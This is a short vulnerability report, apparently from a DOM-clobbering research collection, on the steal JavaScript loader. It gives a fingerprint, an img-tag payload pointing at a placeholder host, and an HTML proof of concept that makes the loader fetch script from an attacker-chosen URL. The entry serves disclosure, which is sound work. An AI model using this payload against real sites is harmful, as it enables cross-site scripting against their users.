## steal

### Meta

+ Library: steal
+ Stars: 1.4K
+ Version: 2.3.0
+ Fingerprint: `typeof window.steal !== 'undefined' && typeof window.steal.loader === 'object'`
+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx">```
+ Impact: XSS
+ CVE: N/A
+ Status: Reported
+ Foundby: TheHulk


### Library

Built locally

https://github.com/stealjs/steal

### Vulnerable Code Snippet

too complicated.

## PoC

after running `npm install`

```html
<!doctype html>
<html>
  <body>
    <image name="currentScript" src="http://localhost:8000/"></image>
    <script src="./node_modules/steal/steal.js" main></script>
  </body>
</html>
```
